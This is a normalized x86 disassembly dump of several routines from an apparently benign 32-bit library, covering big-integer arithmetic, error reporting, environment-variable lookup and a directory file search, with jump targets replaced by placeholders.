mov edi [ esp + 0x14 ]
mov eax [ esi + 0x8 ]
cmp edi eax
jg r-xdata
cmp ebp 0x10
jl r-xdata
mov eax [ esi + 0x8 ]
mov edi 0x10
cmp eax edi
jl r-xdata
push edi
push esi
call sub_10029af0
add esp 0x8
mov eax esi
jmp r-xdata
cmp edi 0xffffffff
jl r-xdata
push edi
push esi
call sub_10029af0
add esp 0x8
mov eax esi
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
mov [ esi + 0x4 ] edi
push ebp
mov edx [ ecx ]
mov ecx [ eax ]
push edx
mov edx [ esi ]
push ebx
push ecx
push edx
call sub_10038560
add esp 0x14
test eax eax
je r-xdata
cmp edi 0x1
jg r-xdata
mov edx [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
mov [ esi + 0x4 ] edi
mov eax [ edx ]
mov edx [ ecx ]
push eax
mov eax [ esi ]
push edx
push eax
call sub_10053890
add esp 0xc
jmp r-xdata
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
cmp eax esi
je r-xdata
mov ecx [ esi ]
lea eax [ ecx + eax * 4 - 0x4 ]
test edi edi
jl r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jle r-xdata
mov [ esp + 0x18 ] 0x1
push esi
push eax
call sub_10029bf0
add esp 0x8
mov edx [ esi + 0x4 ]
dec edx
mov ecx edx
mov [ esi + 0x4 ] edx
test ecx ecx
jg r-xdata
cmp edi 0xffffffff
jne r-xdata
push ebx
call sub_10029820
add esp 0x4
mov [ esp + 0x10 ] eax
mov edx [ eax ]
sub eax 0x4
test edx edx
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x2c ]
dec ecx
mov edi 0x1
push edx
shl edi cl
call sub_1002de70
add esp 0x4
cmp ebx edi
mov [ esp + 0x10 ] eax
jg r-xdata
push ebp
call sub_10029820
add esp 0x4
mov [ esp + 0x10 ] eax
mov edx [ eax + 0x8 ]
lea ecx [ edi + edi ]
shl ecx 0x2
cmp ecx edx
mov [ esp + 0x18 ] ecx
jle r-xdata
cmp ebp edi
jg r-xdata
cmp ecx [ esi + 0x8 ]
jle r-xdata
push ecx
push eax
call sub_10029af0
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
add esp 0x8
mov edx [ eax + 0x8 ]
lea ecx [ edi + edi ]
add ecx ecx
cmp ecx edx
mov [ esp + 0x18 ] ecx
jle r-xdata
mov eax [ eax ]
mov ecx [ esp + 0x28 ]
sub ebp edi
push eax
mov eax [ esp + 0x28 ]
mov edx [ ecx ]
sub ebx edi
push ebp
mov ecx [ eax ]
push ebx
push edi
push edx
mov edx [ esi ]
push ecx
push edx
call sub_10037e60
mov eax [ esp + 0x30 ]
add esp 0x1c
mov [ esi + 0x4 ] eax
jmp r-xdata
push ecx
push esi
call sub_10029af0
mov eax [ esp + 0x18 ]
add esp 0x8
cmp ecx [ esi + 0x8 ]
jle r-xdata
push ecx
push eax
call sub_10029af0
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
add esp 0x8
mov eax [ eax ]
mov ecx [ esp + 0x28 ]
sub ebp edi
push eax
mov eax [ esp + 0x28 ]
mov edx [ ecx ]
sub ebx edi
push ebp
mov ecx [ eax ]
push ebx
push edi
push edx
mov edx [ esi ]
push ecx
push edx
call sub_100379e0
mov eax [ esp + 0x30 ]
add esp 0x1c
mov [ esi + 0x4 ] eax
jmp r-xdata
push ecx
push esi
call sub_10029af0
mov eax [ esp + 0x18 ]
add esp 0x8
sub_10038560
push ebx
push ebp
push esi
mov esi [ esp + 0x20 ]
push edi
mov edi [ esp + 0x1c ]
cmp edi esi
jge r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x18 ]
mov eax edi
mov edi esi
mov esi eax
mov eax [ esp + 0x20 ]
mov [ esp + 0x20 ] ecx
mov [ esp + 0x18 ] eax
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ ecx ]
push edx
push edi
push eax
push ebp
call sub_10053470
add esp 0x10
dec esi
test esi esi
mov [ ebp + edi * 4 ] eax
jle r-xdata
push 0x0
push edi
push eax
push ebp
call sub_10053470
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebp [ esp + 0x14 ]
test esi esi
jg r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esp + 0x20 ]
lea ebx [ ebp + edi * 4 + 0x8 ]
add ebp 0x8
add eax 0x8
mov [ esp + 0x20 ] eax
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x18 ]
mov eax [ edx ]
push eax
push edi
push ecx
push ebp
call sub_100532d0
add esp 0x10
dec esi
test esi esi
mov [ ebx ] eax
jle r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x18 ]
mov eax [ edx + 0x4 ]
lea edx [ ebp + 0x4 ]
push eax
push edi
push ecx
push edx
call sub_100532d0
add esp 0x10
dec esi
test esi esi
mov [ ebx + 0x4 ] eax
jle r-xdata
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x18 ]
mov ecx [ eax + 0x8 ]
lea eax [ ebp + 0x8 ]
push ecx
push edi
push edx
push eax
call sub_100532d0
mov edx [ esp + 0x30 ]
mov [ ebx + 0x8 ] eax
add esp 0x10
add ebx 0x10
add ebp 0x10
add edx 0x10
dec esi
mov [ esp + 0x20 ] edx
test esi esi
jg r-xdata
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x18 ]
mov edx [ ecx - 0x4 ]
lea ecx [ ebp - 0x4 ]
push edx
push edi
push eax
push ecx
call sub_100532d0
add esp 0x10
dec esi
test esi esi
mov [ ebx - 0x4 ] eax
jle r-xdata
sub_10038680
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0x18 ]
mov ebx [ esi + 0xc ]
mov eax [ edi + 0xc ]
xor eax ebx
je r-xdata
push edi
push esi
mov esi [ esp + 0x18 ]
push esi
call sub_10038720
add esp 0xc
mov [ esi + 0xc ] ebx
pop edi
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
push edi
push esi
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
mov eax esi
mov esi edi
mov edi eax
push edi
push esi
mov esi [ esp + 0x18 ]
push esi
call sub_100387f0
add esp 0xc
test eax eax
jne r-xdata
push esi
mov esi [ esp + 0x14 ]
push edi
push esi
call sub_100387f0
add esp 0xc
test eax eax
jne r-xdata
mov [ esi + 0xc ] 0x0
pop edi
pop esi
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop edi
pop esi
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebx
retn
sub_10038720
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0xc ]
push ebx
push ebp
mov edx [ ecx + 0x4 ]
push esi
mov esi [ eax + 0x4 ]
push edi
cmp edx esi
jge r-xdata
mov edi [ ecx + 0x4 ]
mov esi [ esp + 0x14 ]
mov ebx [ eax + 0x4 ]
mov ebp edi
mov edx [ esi + 0x8 ]
lea eax [ edi + 0x1 ]
sub ebp ebx
cmp eax edx
jg r-xdata
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] ecx
mov eax ecx
mov ecx [ esp + 0x18 ]
push eax
push esi
call sub_10029af0
mov ecx [ esp + 0x20 ]
add esp 0x8
mov eax esi
jmp r-xdata
mov eax [ esp + 0x1c ]
mov [ esi + 0x4 ] edi
mov edi [ ecx ]
mov esi [ esi ]
mov eax [ eax ]
push ebx
push eax
push edi
push esi
call sub_100536c0
lea ecx [ ebx * 4 ]
add esp 0x10
add esi ecx
add edi ecx
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
test ebp ebp
je r-xdata
pop edi
pop esi
mov [ eax + 0xc ] 0x0
pop ebp
mov eax 0x1
pop ebx
retn
cmp esi edi
je r-xdata
mov eax [ esp + 0x14 ]
mov [ esi ] 0x1
inc [ eax + 0x4 ]
jmp r-xdata
mov eax [ edi ]
dec ebp
add edi 0x4
inc eax
mov [ esi ] eax
add esi 0x4
test eax eax
jne r-xdata
mov ecx [ edi ]
add edi 0x4
mov [ esi ] ecx
add esi 0x4
dec ebp
jne r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
sub_100387f0
mov eax 0x4
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x14 ]
push ebp
mov ebp [ esp + 0x14 ]
mov ecx [ ebx + 0x4 ]
push esi
mov eax [ ebp + 0x4 ]
push edi
mov esi eax
mov [ esp + 0x10 ] eax
sub esi ecx
mov [ esp + 0x1c ] ecx
jns r-xdata
mov edi [ esp + 0x18 ]
cmp eax [ edi + 0x8 ]
jg r-xdata
push 0xb8
push r--data
push 0x64
push 0x73
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push eax
push edi
call sub_10029af0
add esp 0x8
mov eax edi
jmp r-xdata
mov eax [ ebp ]
mov ebp [ ebx ]
mov ebx [ esp + 0x1c ]
mov ecx [ edi ]
xor edx edx
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
test eax eax
jne r-xdata
cmp ecx eax
je r-xdata
mov edi ebx
mov [ esp + 0x1c ] edi
mov eax [ esp + 0x10 ]
mov [ edi + 0xc ] 0x0
test eax eax
mov [ edi + 0x4 ] eax
jle r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
cmp edi ebx
sbb edx edx
neg edx
sub edi ebx
cmp ebx edi
sbb edx edx
or ebx 0xffffffff
sub ebx [ esp + 0x20 ]
inc edx
add edi ebx
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
mov ecx [ edi ]
lea eax [ ecx + eax * 4 - 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov edx esi
dec esi
test edx edx
je r-xdata
mov edi [ eax ]
mov ebx [ ebp ]
add eax 0x4
add ebp 0x4
test edx edx
mov [ esp + 0x20 ] ebx
je r-xdata
test edx edx
je r-xdata
mov [ ecx ] edi
mov edi [ esp + 0x1c ]
add ecx 0x4
dec edi
mov [ esp + 0x1c ] edi
jne r-xdata
mov edx [ edi + 0x4 ]
dec edx
mov ecx edx
mov [ edi + 0x4 ] edx
test ecx ecx
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx esi
dec esi
test edx edx
je r-xdata
mov edi [ esp + 0x18 ]
test esi esi
jne r-xdata
mov edx [ eax ]
sub eax 0x4
test edx edx
jne r-xdata
mov edx [ eax + 0x8 ]
mov [ ecx + 0x8 ] edx
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx [ eax ]
dec esi
add eax 0x4
add ecx 0x4
lea edi [ edx - 0x1 ]
mov [ ecx - 0x4 ] edi
test edx edx
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov edx [ eax + 0xc ]
add eax 0x10
mov [ ecx + 0xc ] edx
add ecx 0x10
mov edx esi
dec esi
test edx edx
jne r-xdata
test esi esi
jne r-xdata
sub_10038960
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
push edi
test eax eax
mov eax [ esi + 0xc ]
je r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
jg r-xdata
xor edi edi
mov edi 0x1
jmp r-xdata
mov eax ebx
mov ebx esi
mov esi eax
mov edi [ esp + 0x10 ]
cmp eax [ edi + 0x8 ]
jg r-xdata
mov eax ecx
mov [ esi + 0xc ] edi
pop edi
pop esi
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebx
retn
push esi
mov esi [ esp + 0x14 ]
push ebx
push esi
call sub_10038720
add esp 0xc
test eax eax
jne r-xdata
push eax
push edi
call sub_10029af0
add esp 0x8
mov eax edi
jmp r-xdata
push esi
push ebx
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
test eax eax
jne r-xdata
push esi
push ebx
push edi
call sub_100387f0
add esp 0xc
test eax eax
jne r-xdata
push ebx
push esi
push edi
call sub_100387f0
add esp 0xc
test eax eax
jne r-xdata
mov [ edi + 0xc ] 0x0
pop edi
pop esi
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebx
retn
mov [ edi + 0xc ] 0x1
pop edi
pop esi
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebx
retn
sub_10038a30
mov ecx [ esp + 0x4 ]
push esi
xor eax eax
mov esi [ ecx + 0xc ]
mov ecx [ esp + 0xc ]
sub ecx 0x2
jne r-xdata
pop esi
retn
mov eax [ esp + 0x14 ]
cmp eax 0x3
jne r-xdata
mov edx [ esp + 0x10 ]
push eax
push edx
push esi
call sub_10038b80
add esp 0xc
pop esi
retn
call sub_100585d0
push eax
call getenv
add esp 0x4
test eax eax
push 0x1
jne r-xdata
push eax
push esi
call sub_10038b80
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
call sub_100585b0
mov eax esi
push 0x8a
push r--data
push 0x67
push 0x66
push 0xb
call sub_1001de60
add esp 0x14
sub_10038ab0
push esi
push edi
push 0x98
push r--data
push 0x14
call sub_1001d4c0
mov esi eax
xor edi edi
add esp 0xc
cmp esi edi
jne r-xdata
call sub_1001dc60
cmp eax edi
mov [ esi ] eax
jne r-xdata
pop edi
xor eax eax
pop esi
retn
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ eax + 0xc ] esi
pop edi
mov eax 0x1
pop esi
retn
push esi
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
retn
sub_10038b10
mov eax [ esp + 0x4 ]
push esi
push edi
xor edi edi
mov esi [ eax + 0xc ]
mov eax [ esi + 0x4 ]
test eax eax
jle r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + edi * 4 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ esi + 0x4 ]
inc edi
cmp edi eax
jl r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ esi ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
pop edi
pop esi
retn
push eax
call sub_1001dca0
add esp 0x4
sub_10038b80
mov eax 0xc
call sub_1001d0d0
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
test eax eax
push edi
je r-xdata
push 0xbe
push r--data
push 0x71
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp + 0x20 ]
mov edi eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x24 ] edi
mov eax [ esp + 0x10 ]
mov ebp edi
lea ecx [ edi + 0x1 ]
sub ebp eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] ecx
je r-xdata
test al al
jne r-xdata
inc edi
mov [ esp + 0x24 ] edi
jmp r-xdata
mov eax [ ebx + 0x4 ]
xor esi esi
test eax eax
jle r-xdata
cmp [ edi ] 0x0
je r-xdata
mov al [ edi ]
cmp al 0x3b
je r-xdata
mov ecx [ ebx + 0x4 ]
cmp esi ecx
jl r-xdata
mov edx [ ebx + 0x8 ]
or ecx 0xffffffff
xor eax eax
mov edx [ edx + esi * 4 ]
mov edi edx
[ edi ]
not ecx
dec ecx
cmp ecx ebp
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xc
retn
mov eax [ ebx + 0x10 ]
inc ecx
cmp eax ecx
jge r-xdata
mov eax [ ebx + 0x4 ]
inc esi
cmp esi eax
jl r-xdata
mov eax [ esp + 0x14 ]
push ebp
push eax
push edx
call strncmp
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0xc ]
mov ecx [ esp + 0x28 ]
push 0xea
mov [ eax + edx * 4 ] ecx
lea edx [ ebp + 0x1 ]
push r--data
push edx
call sub_1001d4c0
mov ecx [ ebx + 0x4 ]
mov edx [ ebx + 0x8 ]
add esp 0xc
mov [ edx + ecx * 4 ] eax
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
mov eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
add eax 0xa
push 0xd6
push r--data
mov [ ebx + 0x10 ] eax
lea ecx [ eax * 4 ]
push ecx
call sub_1001d4c0
mov edx [ ebx + 0x10 ]
push 0xd8
shl edx 0x2
mov edi eax
push r--data
push edx
mov [ esp + 0x30 ] edi
call sub_1001d4c0
add esp 0x18
mov [ esp + 0x20 ] eax
test edi edi
je r-xdata
mov edi [ esp + 0x24 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xc
retn
mov edx [ esp + 0x14 ]
push ebp
push edx
push eax
call strncpy
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
add esp 0xc
mov edx [ ecx + eax * 4 ]
mov [ edx + ebp ] 0x0
mov eax [ ebx + 0x4 ]
inc eax
mov [ ebx + 0x4 ] eax
push 0xdb
push r--data
push 0x41
jmp r-xdata
test eax eax
je r-xdata
push 0x64
push 0xb
call sub_1001de60
add esp 0x14
mov ecx [ ebx + 0x10 ]
mov esi [ ebx + 0x8 ]
lea ecx [ ecx * 4 - 0x28 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x10 ]
mov esi [ ebx + 0xc ]
mov edi eax
lea ecx [ ecx * 4 - 0x28 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x8 ]
test ecx ecx
je r-xdata
mov ecx [ ebx + 0xc ]
test ecx ecx
je r-xdata
push ecx
call sub_1001d740
mov eax [ esp + 0x24 ]
add esp 0x4
mov ecx [ esp + 0x18 ]
mov edi [ esp + 0x24 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] eax
push ecx
call sub_1001d740
mov eax [ esp + 0x24 ]
add esp 0x4
sub_10038da0
mov eax 0xc0
call sub_1001d0d0
push ebp
push edi
mov edi [ esp + 0xd4 ]
xor ebp ebp
cmp edi ebp
mov [ esp + 0x10 ] ebp
jne r-xdata
mov eax [ esp + 0xd0 ]
push esi
cmp eax 0x1
mov [ esp + 0x1c ] eax
jne r-xdata
pop edi
xor eax eax
pop ebp
add esp 0xc0
retn
cmp eax 0x2
jne r-xdata
lea eax [ esp + 0x80 ]
lea ecx [ esp + 0x24 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x94 ] edi
mov [ esp + 0x20 ] ecx
mov [ esp + 0x10 ] rw-data
jmp r-xdata
push 0x11e
push r--data
push 0x70
push 0x67
push 0xb
call sub_1001de60
mov eax [ esp + 0x28 ]
add esp 0x14
pop esi
pop edi
pop ebp
add esp 0xc0
retn
lea edx [ esp + 0x34 ]
lea eax [ esp + 0x24 ]
mov [ esp + 0x24 ] edx
mov [ esp + 0x3c ] edi
mov [ esp + 0x20 ] eax
mov [ esp + 0x10 ] r--data
push ebx
call sub_1001dc60
mov esi eax
cmp esi ebp
jne r-xdata
mov ecx [ esp + 0xd4 ]
push edi
mov ebx [ ecx + 0xc ]
call sub_100216e0
mov [ esp + 0x20 ] eax
mov eax [ ebx + 0x4 ]
add esp 0x4
cmp eax ebp
mov [ esp + 0x10 ] ebp
jle r-xdata
push 0x124
push r--data
push 0x7
test esi esi
pop ebx
je r-xdata
mov edx [ ebx + 0x8 ]
or ecx 0xffffffff
xor eax eax
mov edi [ edx + ebp ]
[ edi ]
not ecx
add ecx 0x10
push ecx
push esi
call sub_1001dce0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
pop esi
pop edi
pop ebp
add esp 0xc0
retn
push esi
call sub_1001dca0
add esp 0x4
push 0x130
push r--data
push 0x41
jmp r-xdata
xor edi edi
push 0x67
push 0xb
call sub_1001de60
add esp 0x14
push 0x16b
push r--data
push 0xb
push 0x5
call sub_1001f5b0
mov edi [ esp + 0xe4 ]
lea ecx [ esp + 0x30 ]
push ecx
mov edx [ edi + 0x10 ]
mov eax [ edx + 0x4 ]
push eax
call sub_1001e620
add esp 0x18
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0xd8 ]
cmp eax 0x1
jne r-xdata
xor edi edi
mov ecx [ edi + 0x10 ]
push eax
mov edx [ ecx + 0x4 ]
push edx
call sub_1001e7c0
add esp 0x8
mov edi eax
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
mov ecx [ esi + 0x4 ]
mov eax [ edx + ebp ]
mov edx [ esp + 0xd4 ]
push eax
push ecx
push edx
call sub_100390d0
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0xe0 ]
mov ecx [ edi ]
mov [ esp + 0x18 ] 0x1
mov [ eax ] ecx
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ ebx + 0x4 ]
inc eax
add ebp 0x4
cmp eax ecx
mov [ esp + 0x10 ] eax
jl r-xdata
push 0x16f
push r--data
push 0xb
push 0x6
call sub_1001f5b0
add esp 0x10
test edi edi
jne r-xdata
mov eax [ esp + 0x14 ]
mov edx [ ebx + 0x8 ]
mov ecx [ esp + 0x1c ]
push edi
push eax
mov eax [ edx + ebp ]
mov edx [ esi + 0x4 ]
push ecx
mov ecx [ esi + 0x8 ]
push 0x2f
push eax
push r--data
push ecx
push edx
call sub_100279b0
mov ecx [ esi + 0x4 ]
lea eax [ esp + 0xcc ]
push eax
push ecx
inc edi
call _stat
add esp 0x28
test eax eax
jl r-xdata
mov eax [ ebx + 0xc ]
mov edx [ esi + 0x4 ]
mov ecx [ eax + ebp ]
mov eax [ esp + 0xd4 ]
push ecx
push edx
push eax
call sub_10039250
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
jmp r-xdata
sub_10039020
mov ecx [ esp + 0x8 ]
xor eax eax
dec ecx
push esi
jne r-xdata
pop esi
retn
mov eax [ esp + 0x14 ]
cmp eax 0x3
jne r-xdata
cmp eax 0x1
jne r-xdata
call sub_100585e0
push eax
call getenv
add esp 0x4
test eax eax
push 0x1
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
push eax
push ecx
push edx
call sub_100390d0
add esp 0xc
neg eax
sbb eax eax
pop esi
neg eax
retn
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0xc ]
push edx
push eax
call sub_100393d0
add esp 0xc
neg eax
sbb eax eax
pop esi
neg eax
retn
call sub_100585c0
mov ecx [ esp + 0xc ]
push eax
push ecx
push eax
mov eax [ esp + 0x10 ]
push eax
jmp r-xdata
mov eax esi
push 0x72
push r--data
push 0x68
push 0x65
push 0xb
call sub_1001de60
add esp 0x14
call sub_100393d0
mov esi eax
add esp 0xc
neg esi
sbb esi esi
neg esi
test esi esi
jne r-xdata
sub_100390d0
mov eax 0x4
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x14 ]
xor ebx ebx
test esi esi
mov [ esp + 0x8 ] 0x0
jne r-xdata
push ebp
push edi
call sub_1002a520
push eax
call sub_100207d0
mov edi eax
add esp 0x4
test edi edi
je r-xdata
pop esi
mov eax 0x1
pop ebx
pop ecx
retn
push 0x8e
push r--data
push 0x2
push 0x6f
push 0xb
call sub_1001de60
add esp 0x14
jmp r-xdata
push esi
push 0x3
push 0x6c
push edi
call sub_10020c60
add esp 0x10
test eax eax
jle r-xdata
test edi edi
je r-xdata
mov eax [ esp + 0x20 ]
cmp eax 0x1
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop ebp
pop esi
pop ebx
pop ecx
retn
push edi
call sub_10020880
add esp 0x4
cmp eax 0x2
jne r-xdata
push 0x0
push 0x0
push 0x0
push edi
call sub_100585f0
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0xbc
push r--data
push 0x64
push 0x6f
push 0xb
call sub_1001de60
add esp 0x14
jmp r-xdata
push 0x0
push edi
call sub_1002f6e0
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
call sub_1001e020
and eax 0xfff
cmp eax 0x6c
jne r-xdata
mov ebp [ esp + 0x18 ]
mov ecx [ esp + 0x18 ]
push esi
mov edx [ ecx + 0x10 ]
push edx
call sub_10021ea0
add esp 0x8
test eax eax
je r-xdata
push 0xb3
push r--data
push 0xd
jmp r-xdata
push 0xa2
push r--data
push 0x9
test ebx ebx
jle r-xdata
test esi esi
je r-xdata
push esi
inc ebx
call sub_10022870
push 0x0
push 0x0
push 0x0
push edi
call sub_100585f0
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
mov [ esp + 0x10 ] eax
jmp r-xdata
push 0x6f
push 0xb
call sub_1001de60
add esp 0x14
push esi
call sub_10022870
add esp 0x4
call sub_1001df60
mov [ esp + 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
push esi
push eax
call sub_10021ea0
add esp 0x8
test eax eax
je r-xdata
sub_10039250
mov eax 0x4
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x14 ]
xor ebx ebx
test esi esi
mov [ esp + 0x8 ] 0x0
jne r-xdata
push ebp
push edi
call sub_1002a520
push eax
call sub_100207d0
mov edi eax
add esp 0x4
test edi edi
je r-xdata
pop esi
mov eax 0x1
pop ebx
pop ecx
retn
push 0xd1
push r--data
push 0x2
push 0x70
push 0xb
call sub_1001de60
add esp 0x14
jmp r-xdata
push esi
push 0x3
push 0x6c
push edi
call sub_10020c60
add esp 0x10
test eax eax
jle r-xdata
test edi edi
je r-xdata
mov eax [ esp + 0x20 ]
cmp eax 0x1
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop ebp
pop esi
pop ebx
pop ecx
retn
push edi
call sub_10020880
add esp 0x4
cmp eax 0x2
jne r-xdata
push 0x0
push 0x0
push 0x0
push edi
call sub_1002f750
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0xff
push r--data
push 0x64
push 0x70
push 0xb
call sub_1001de60
add esp 0x14
jmp r-xdata
push 0x0
push edi
call sub_1002f700
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
call sub_1001e020
and eax 0xfff
cmp eax 0x6c
jne r-xdata
mov ebp [ esp + 0x18 ]
mov ecx [ esp + 0x18 ]
push esi
mov edx [ ecx + 0x10 ]
push edx
call sub_10022090
add esp 0x8
test eax eax
je r-xdata
push 0xf6
push r--data
push 0xd
jmp r-xdata
push 0xe5
push r--data
push 0x9
test ebx ebx
jle r-xdata
test esi esi
je r-xdata
push esi
inc ebx
call sub_100350a0
push 0x0
push 0x0
push 0x0
push edi
call sub_1002f750
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
mov [ esp + 0x10 ] eax
jmp r-xdata
push 0x70
push 0xb
call sub_1001de60
add esp 0x14
push esi
call sub_100350a0
add esp 0x4
call sub_1001df60
mov [ esp + 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
push esi
push eax
call sub_10022090
add esp 0x8
test eax eax
je r-xdata
sub_100393d0
mov eax [ esp + 0xc ]
push ebp
xor ebp ebp
push esi
cmp eax 0x1
push edi
je r-xdata
mov edx [ esp + 0x14 ]
push r--data
push edx
call sub_1002a440
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov ecx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x18 ]
push eax
push ecx
call sub_100390d0
add esp 0xc
pop edi
pop esi
pop ebp
retn
push 0x0
push 0x0
push 0x0
push esi
call sub_100586e0
push esi
mov edi eax
call sub_10020880
add esp 0x14
test edi edi
jne r-xdata
push 0x112
push r--data
push 0x2
jmp r-xdata
push ebx
push edi
xor ebx ebx
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push 0x118
push r--data
push 0x9
push 0x84
push 0xb
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
retn
push sub_10058670
push edi
call sub_1001e730
add esp 0x8
mov eax ebp
pop ebx
pop edi
pop esi
pop ebp
retn
push ebx
push edi
call sub_1001e7c0
mov esi eax
add esp 0x8
mov eax [ esi ]
test eax eax
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
push eax
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x10 ]
push ecx
call sub_10021ea0
add esp 0x8
inc ebp
push edi
inc ebx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
mov edx [ esp + 0x14 ]
push esi
mov eax [ edx + 0x10 ]
push eax
call sub_10022090
add esp 0x8
inc ebp
sub_100394d0
mov eax 0x4
call sub_1001d0d0
push esi
or esi 0xffffffff
call sub_1004ef50
test eax eax
mov [ esp + 0x4 ] eax
jne r-xdata
mov eax [ esp + 0x1c ]
push edi
lea ecx [ esp + 0x1c ]
push eax
lea edx [ esp + 0xc ]
push ecx
push edx
call sub_1004ef10
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
pop esi
pop ecx
retn
mov eax [ esp + 0x8 ]
push eax
call sub_1004ef60
add esp 0x4
mov eax esi
pop edi
pop esi
pop ecx
retn
mov edi [ esp + 0x24 ]
mov esi [ esp + 0x8 ]
push edi
call sub_10036220
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ eax + 0xc ]
